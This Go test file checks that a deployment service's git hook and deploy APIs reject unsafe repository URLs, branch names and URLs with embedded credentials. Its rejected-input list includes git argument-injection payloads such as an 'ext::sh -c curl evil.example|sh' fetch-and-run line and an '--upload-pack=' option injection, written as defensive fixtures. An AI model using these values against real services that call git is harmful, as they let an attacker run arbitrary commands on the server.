package apitest_test

// SetGitHook 受理面校验（安全批 P0）：repo 是控制面 `git clone` argv 的
// 直通源——ext::/--upload-pack= 等传输形态在 root 控制面上等价任意命令
// 执行。受理位只放行 https:// 直连仓库，branch 拒控制字符/空白。

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"

	deliveryv1 "github.com/fleetlyrun/fleetly/genproto/fleetly/delivery/v1"
	"github.com/fleetlyrun/fleetly/internal/testsupport/apitest"
)

// TestSetGitHookRepoValidation：非法 repo/branch 形态在受理位拒绝（create
// 与 update 两路径共用同一校验；此处 create 路径全覆盖 + update 路径抽样）。
func TestSetGitHookRepoValidation(t *testing.T) {
	h := apitest.New(t)
	ctx := h.Ctx()
	hooks := deliveryv1.NewHooksServiceClient(h.Conn)

	appID := h.CreateApp(t, h.CreateProject(t, "hookguard").GetId(), "web").GetId()

	illegalRepos := []string{
		"",                                   // 空
		"   ",                                // 纯空白
		"ext::sh -c curl evil.example|sh",    // ext 传输 = 任意命令执行
		"--upload-pack=touch /tmp/pwn",       // 选项形态
		"git@github.com:acme/shop.git",       // ssh 形态
		"ssh://git@github.com/acme/shop.git", // ssh scheme
		"git://github.com/acme/shop.git",     // git 协议
		"file:///tmp/repo",                   // 本地路径
		"/var/lib/git/shop",                  // 裸本地路径
		"http://github.com/acme/shop.git",    // 明文 http
		"https://github.com/ac me/shop.git",  // URL 内空白
		"https://github.com/ac\x00me/shop",   // URL 内控制字符
	}
	for _, repo := range illegalRepos {
		_, err := hooks.SetGitHook(ctx, &deliveryv1.SetGitHookRequest{AppId: appID, Repo: repo})
		require.Error(t, err, "repo %q must be rejected", repo)
		assert.Equal(t, codes.InvalidArgument, status.Code(err), "repo %q", repo)
		assert.Contains(t, err.Error(), "E_INVALID_ARGUMENT", "repo %q", repo)
	}

	// 合法形态（干净 https URL——材料经 github app / git:<host> secret
	// 构建期解析）照常受理。
	legal, err := hooks.SetGitHook(ctx, &deliveryv1.SetGitHookRequest{
		AppId: appID, Repo: "https://github.com/acme/shop.git", Branch: "main",
	})
	require.NoError(t, err)
	require.NotEmpty(t, legal.GetSecret())

	// update 路径同款拦截（既有行改 repo 为恶意形态仍被拒）。
	_, err = hooks.SetGitHook(ctx, &deliveryv1.SetGitHookRequest{AppId: appID, Repo: "ext::sh -c id"})
	require.Error(t, err)
	assert.Equal(t, codes.InvalidArgument, status.Code(err))
}

// TestSetGitHookBranchValidation：branch 进 `git clone --branch` 参数位，
// 控制字符/空白形态一律拒绝（normalizeBranch 剥不掉的才漏到这里——首尾
// 空白由归一面清洗，属合法形态）。
func TestSetGitHookBranchValidation(t *testing.T) {
	h := apitest.New(t)
	ctx := h.Ctx()
	hooks := deliveryv1.NewHooksServiceClient(h.Conn)

	appID := h.CreateApp(t, h.CreateProject(t, "branchguard").GetId(), "web").GetId()

	for _, branch := range []string{
		"ma\x00in",    // 嵌入 NUL（TrimSpace 剥不掉）
		"main\x1b",    // 嵌入 ESC
		"main branch", // 内嵌空白
	} {
		_, err := hooks.SetGitHook(ctx, &deliveryv1.SetGitHookRequest{AppId: appID, Repo: "https://github.com/acme/shop.git", Branch: branch})
		require.Error(t, err, "branch %q must be rejected", branch)
		assert.Equal(t, codes.InvalidArgument, status.Code(err), "branch %q", branch)
	}

	// 合法形态：首尾空白被归一面清洗、refs/heads/ 前缀被剥，均受理。
	ok, err := hooks.SetGitHook(ctx, &deliveryv1.SetGitHookRequest{
		AppId: appID, Repo: "https://github.com/acme/shop.git", Branch: " refs/heads/main ",
	})
	require.NoError(t, err)
	assert.Equal(t, "main", ok.GetHook().GetBranch())
}

// TestGitSourceSpecIntakeCleanURL：spec 面 git 仓库受理律（ADR-0073 阶段
// A 决策 6）与 hook 面同口径——内嵌 userinfo 的 spec_file 部署在受理位
// 拒绝（材料会明文冻结进 Revision）；干净 URL 照常受理（webhook 合成 spec
// 同形，freeze 全链的既负 example）。
func TestGitSourceSpecIntakeCleanURL(t *testing.T) {
	h := apitest.New(t)
	ctx := h.Ctx()
	deployments := deliveryv1.NewDeploymentsServiceClient(h.Conn)

	appID := h.CreateApp(t, h.CreateProject(t, "gitspec").GetId(), "web").GetId()

	specFor := func(repo string) string {
		return `{"source":{"git":{"repo":"` + repo + `","ref":"main"}},"build":{"builder":"dockerfile","dockerfile":"Dockerfile"},"processes":[{"name":"web","from_build":"/"}]}`
	}

	_, err := deployments.Deploy(ctx, &deliveryv1.DeployRequest{
		AppId: appID, SpecFile: specFor("https://user:ghp_x@github.com/acme/web"),
	})
	require.Error(t, err, "a materialized git URL must be refused at spec intake")
	assert.Contains(t, err.Error(), "access material")
	assert.Equal(t, codes.InvalidArgument, status.Code(err), "spec intake rejects map to invalid argument")

	ok, err := deployments.Deploy(ctx, &deliveryv1.DeployRequest{
		AppId: appID, SpecFile: specFor("https://github.com/acme/web"),
	})
	require.NoError(t, err)
	assert.NotEmpty(t, ok.GetDeployment().GetId(), "a clean https git source freezes normally")
}
